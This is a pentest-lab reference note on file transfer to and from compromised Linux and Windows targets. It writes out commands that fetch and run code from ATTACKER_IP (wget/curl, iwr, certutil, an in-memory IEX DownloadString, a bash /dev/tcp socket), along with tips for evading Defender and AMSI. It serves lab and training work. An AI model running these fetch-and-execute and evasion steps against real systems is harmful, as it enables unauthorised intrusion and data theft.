---
type: technique
platform: any
status: working
fluency: guided
source: lab
updated: 2026-09-08
---

# File Transfer

Getting a file onto the target (an enumeration script, a payload) or off it (a database dump, a registry hive). Eight notes point here, so this is a decision layer, not a command list: **pick the channel by what the target can reach and what it already ships**, then verify the file arrived whole. The second half is the one people skip, and it is where the hour goes.

Order of preference: a channel that already exists — SMB, SSH, an HTTP client the box ships — beats one you build; anything beats pasting base64 into a shell.

## 1 — Stand up something to pull from

**Why now** — you have a shell but no way to move bytes into it, and almost every pull below needs a server on your side to pull *from*. Stand this up first, in a directory holding only what the target should see, before you type a single fetch command on the target.

```bash
python3 -m http.server 80
```

- serve a **dedicated** directory, never your home → this process hands out everything beneath it to anyone who connects. `cd ~/transfer` first; a stray `python3 -m http.server` in `~` publishes your keys, your notes and every other box's loot.
- port `80` or `443`, not `8000` → these survive egress filtering that drops high ports, and they are the ports a locked-down target is allowed to reach outward on. Both need `sudo` because ports under 1024 are privileged — the failure when you forget is `Permission denied` at *bind* time, on your own machine, which is easy to misread as a target problem.

```bash
impacket-smbserver share "$(pwd)" -smb2support -user a -password a
```

- an SMB share Windows reads with a plain [[Security-Terms#^unc|UNC path]] — no download step and often nothing written to disk: `type \\ATTACKER_IP\share\file.txt` reads it straight off the wire.
- `-smb2support` → modern Windows refuses [[Security-Terms#^smbv1|SMBv1]] outright; omit this and the target answers `The specified network name is no longer available` and you debug the network instead of the handshake.
- `-user`/`-password` → Windows 10 and 11 refuse guest auth to a share by default. An unauthenticated share fails with `STATUS_ACCESS_DENIED` on exactly the modern targets you most want it for; give it a throwaway credential and map with `net use`.

**What you will see**

- **Found** — on your side, one request line per fetch: `10.10.x.x - - [..] "GET /linpeas.sh HTTP/1.1" 200 -`. That `200` with a byte count is your proof the target reached you and the file exists. Watch this window while you fetch; it is the fastest diagnosis you have.
- **Empty** — the server prints nothing at all when you fetch from the target: the target never reached you. Wrong attacker IP in the target command, a port the target's egress blocks, or you are on the wrong [[Security-Terms#^vpn|VPN]] interface (`ip a` — use the `tun0` address, not your [[Security-Terms#^lan|LAN]] one).
- **Error** — `OSError: [Errno 98] Address already in use` means a server is already on that port (an old `http.server`, or Burp on 8080); kill it or pick another. `Permission denied` binding 80/443 means you forgot `sudo`.
- **Noise** — a `404` in the log is not a network failure — you reached each other fine, the path is just wrong. A `301` means you asked for a directory; add the filename.

**Then** — a `200` in the log and a good hash (section 5) means the file landed; go run it. No request line at all means the problem is reachability, so drop to section 4's no-network route or fix the IP/port. A `404` means fix the path, not the channel.

## 2 — Pull onto a Linux target

**Why now** — your server is up and the target is Linux. Now choose the client by what the box ships, because reaching for one that is not installed wastes a round trip you can avoid by trying the common one first.

```bash
wget http://ATTACKER_IP/linpeas.sh -O /tmp/lp.sh || curl http://ATTACKER_IP/linpeas.sh -o /tmp/lp.sh
```

- write to `/tmp` or `/dev/shm` → the current directory is often not writable by the web user, and the failure is `Permission denied` at write time, which reads like the fetch failed when it succeeded. `/dev/shm` is memory-backed, so nothing touches disk.
- `-O` / `-o` name the output → without them `wget` derives a filename and `curl` prints the file to your terminal instead of saving it. Full flag reference: [[Curl-and-Wget]].
- the `||` → tries `wget`, falls back to `curl`. One of the two is on essentially every Linux host; this saves you checking first.

Neither installed? The target still has one of these interpreters:

```bash
python3 -c 'import urllib.request as u; u.urlretrieve("http://ATTACKER_IP/f","/tmp/f")'
```

**What you will see**

- **Found** — `wget` prints a progress bar ending `saved [12345/12345]` with matching numbers; `curl -o` prints a bar reaching 100%. The `200` also appears in your server log.
- **Empty** — a file that exists but is `0` bytes, or holds an HTML `<title>404 Not Found` page saved under your filename. The transfer "worked" and delivered nothing: check the path and that you are serving the directory you think you are.
- **Error** — `Connection refused` from the target while the URL works in your own browser is almost always the port — you served on `8000` and the target's egress allows only `80`/`443`. `No route to host` is different: no path back to you at all, which means section 4. `wget: command not found` **and** `curl: command not found` sends you to the python line.
- **Noise** — a [[Security-Terms#^tls|TLS]] certificate complaint on an `https://` pull reads like a warning and is a refusal: `wget` stops and prints `To connect insecurely, use '--no-check-certificate'`, and no bytes arrive. Add that flag, or `curl -k`, and run it again. `curl` without `-o` is the other one — it prints the file to the terminal, so a binary fills the screen with garbage that looks like a crash and is a missing flag.

**Then** — verified file goes to whatever you transferred it for. `Connection refused` or `No route` goes to section 4. `command not found` on every client goes to the same place.

## 3 — Pull onto a Windows target

**Why now** — the target is Windows, so the Linux clients are gone and the right tool depends on whether you are standing in PowerShell or `cmd.exe`, and on whether Defender is watching the disk. Pick the in-memory route when you can, because a file that never touches disk is a file the on-disk scanner never sees. It is not invisible: AMSI reads the script text as PowerShell runs it, so an in-memory pull dodges the file scan and not the content scan.

```powershell
iwr http://ATTACKER_IP/winPEASx64.exe -outfile "$env:TEMP\wp.exe" -UseBasicParsing
```

- `-UseBasicParsing` → on Windows PowerShell, `iwr` (`Invoke-WebRequest`) parses the response with Internet Explorer's engine, and on a profile where IE has never been launched it fails with `The response content cannot be parsed because the Internet Explorer engine is not available`. This flag skips that engine. The error names the browser, so it reads like a broken host rather than a missing flag. PowerShell 6 and later parse this way already.
- write to `$env:TEMP` → a predictable writable path; a bare filename lands in the current directory, which may be `C:\Windows\System32` where you cannot write.

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/enum.ps1')
```

- runs the script **in memory** — nothing is written, so on-disk antivirus never sees a file and there is nothing to clean up. This is the route to reach for when a downloaded `.exe` keeps disappearing. AMSI still reads the script as it runs, so a block here is a content decision, not a file one, and repeating the same command changes nothing.

From `cmd.exe`, where those are unavailable:

```cmd
certutil.exe -urlcache -split -f http://ATTACKER_IP/x.exe %TEMP%\x.exe
```

- `certutil` is a certificate tool that happens to fetch URLs. It is on every Windows and for exactly that reason is heavily signatured — a loud choice on a monitored host, and Defender now flags the download itself on many builds.

**What you will see**

- **Found** — `iwr` returns to a prompt with no error and the file is at `$env:TEMP`; `DownloadString` runs the script and its output appears inline. `certutil` prints `CertUtil: -URLCache command completed successfully.`
- **Empty** — a file that downloads and then **vanishes** within seconds was eaten by Defender. That is not a transfer failure — switch to the in-memory `IEX` route, which creates no file, or a payload Defender does not recognise.
- **Error** — `iwr : Unable to connect to the remote server` is reachability (IP/port/egress), same triage as Linux. A red `... operation ... failed` block from `IEX` naming `AmsiScanBuffer` or `This script contains malicious content` is [[Security-Terms#^amsi|AMSI]], not the network — the bytes arrived and were then blocked in memory. `certutil` printing `The remote server returned an error: (404)` is a wrong path, not a block.
- **Noise** — `iwr` shows a `WARNING: ... -UseBasicParsing` deprecation notice on newer PowerShell; harmless, the file still transferred.

**Then** — a file blocked on disk (Defender) or in memory (AMSI) both point at the in-memory route and, past that, at bypasses beyond this note's scope. A reachability error goes to section
4. A clean transfer goes to [[Windows-Automated-Enumeration]] or whatever you pulled it for.

## 4 — When there is no network path back

**Why now** — sections 1-3 all assume the target can open a connection to you, and sometimes it simply cannot: egress is fully filtered, or you only have a blind command-injection channel. A shell with no route back still carries **text**, so you move the file as text.

```bash
base64 -w0 payload.bin          # attacker: one unbroken line to copy
```

```bash
echo -n '<blob>' | base64 -d > /tmp/payload.bin      # linux target
```

```powershell
[IO.File]::WriteAllBytes("$env:TEMP\p.exe",[Convert]::FromBase64String("<blob>"))
```

- `-w0` → do **not** wrap at 76 columns. Wrapped output pasted into a shell arrives with newlines mid-blob and decodes to a corrupt file that fails a hash check for a reason that is invisible in the terminal. This one flag is the whole trick.
- practical to a few hundred KB → beyond that the paste itself is the failure: terminals drop characters on very long pastes, and a single dropped character ruins the decode.

**What you will see**

- **Found** — the decode returns silently and section 5's hash matches the source. Silence is success here.
- **Empty** — a `0`-byte output file means the paste never delivered — the blob was empty or the redirection was wrong.
- **Error** — `base64: invalid input` means a character was dropped or a wrap newline crept in; re-encode with `-w0` and re-paste. A file that decodes without error but **fails the hash** is the corrupt-but-plausible case: it will then fail to run for reasons you will chase in the wrong place, which is why section 5 is not optional.
- **Noise** — none; this channel either delivers the exact bytes or visibly breaks.

**Then** — verified file goes to its purpose. A repeated `invalid input` or hash mismatch on a large file means the paste size is the problem — split the blob, or find any network path at all and use section 1.

## 5 — Verify it arrived whole

**Why now** — every route above can report success and deliver a truncated or mangled file, and a corrupt binary fails at *run* time with an error that points nowhere near the transfer. Thirty seconds here saves the hour you would spend debugging the payload instead of the copy.

```bash
md5sum payload.bin                       # attacker and linux target, compare the two
```

```powershell
Get-FileHash -Algorithm MD5 $env:TEMP\p.exe    # windows target
```

- compare against the **source** hash on your own box → the number is meaningless alone; you are checking the two match. Run `md5sum` on the original before you transfer, so you have something to compare to.
- [[Security-Terms#^md5|MD5]] is fine here → you are detecting accidental truncation, not defending against a forger. Speed matters more than collision resistance for this check.

**What you will see**

- **Found** — identical hashes. The file is byte-for-byte the source; any later failure is the file's own, not the transfer's.
- **Empty** — `md5sum: payload.bin: No such file or directory` means the previous step wrote nothing or wrote elsewhere — the transfer did not actually land, whatever it reported.
- **Error** — hashes that **differ** is the finding this section exists for: the file is corrupt or truncated. Re-transfer, and if it corrupts again, suspect the channel — a base64 paste that was too long, or a text-mode transfer that mangled a binary.
- **Noise** — a shell that dies the moment you run the transferred file, *with* a matching hash, was not corrupted — it was never made executable (`chmod +x`), or its architecture or libc does not match the target. Do not re-transfer a file whose hash already matched.

**Then** — matching hash and the job runs: done. Mismatch sends you back to whichever section you used, with the channel itself now the suspect. A good hash but a dead run on Linux means `chmod +x`; on Windows it means Defender or a wrong architecture, back to section 3.

## Service-native channels

When one of these ports is already open and authenticated, it beats standing up a server at all — the transfer rides a channel that exists:

- [[445-SMB]] — `get` / `put` / `mget *` at the `smbclient` prompt
- [[873-rsync]] — when an rsync module is exposed
- [[21-FTP]] — when port 21 is open and a login lands; **`put` needs a second argument** or it sends the full local path as the remote name and the server answers `553`, which reads exactly like a permission denial
- [[5985-WinRM]] — `upload` and `download` are built into the Evil-WinRM session
- [[22-SSH]] — `scp file user@host:/tmp/` when you hold SSH credentials

## Rarely — worth one command, not worth a step

**Why now** — the target has no downloader at all. No `wget`, no `curl`, no `python3`, no `certutil`. This is the stripped-container case, and the shell itself is the only tool left.

```bash
exec 3<>/dev/tcp/ATTACKER_IP/80
```

- `bash` can open a network socket without any program to help it. File descriptor `3` is now a live connection, and you write a request into it and read the response back out.
- This is a `bash` feature and nothing else has it. A `dash` or `sh` shell returns `No such file or directory` for the same line, which reads like a missing device rather than a missing feature.
- Follow it with a printed `GET` request into descriptor `3`, then read from it. The transfer is plain text, so it suits scripts and not binaries.

**What you will see**

- **Found** — the command returns silently, which means the socket opened. Silence is success here, which is the opposite of everywhere else in this note.
- **Empty** — nothing to read back means the connection opened and the server said nothing. Check the listener before blaming the shell.
- **Error** — `No such file or directory` means this shell is not `bash`. `Connection refused` means the shell is fine and nothing is listening.
- **Noise** — an interactive shell prints the response and the prompt together, which makes a successful read look like corruption. It is not.

**Then** — a working socket goes back to section 4 above, since a text-only channel and a base64 blob solve the same problem together. A shell without the feature means the only route left is a service-native channel from the section below.

## Reading the output

Two failures wear a disguise across every channel above, so name them once.

A `Connection refused` from the target while the same URL loads in **your** browser is the port, almost every time: you served high and the target may only reach `80`/`443`. `No route to host` is the harsher cousin — no path back at all — and it is what sends you to the base64 route rather than to a different port.

On Windows, a file that transfers and then disappears is Defender, not a broken copy, and the answer is a channel that writes no file (`IEX`) rather than a retry of the same one. A file that arrives with a matching hash and still will not run was never the transfer's fault: `chmod +x`, or an architecture mismatch, or AMSI blocking it in memory after a clean copy to disk.

## Next

- [[Shells]] — the shell you need before any of these channels is reachable
- [[Curl-and-Wget]] — the HTTP pull side, in detail
- [[Linux-Automated-Enumeration]] · [[Windows-Automated-Enumeration]] — what you are usually transferring, and why

## Gaps

- No [[Security-Terms#^sftp|SFTP]] note; `scp` is named above but not documented as its own channel.
- No `bitsadmin` (Windows background transfer service) — the alternative when `certutil` is blocked.
- Nothing on transfer detection: which of these channels a defender sees, and how loudly.
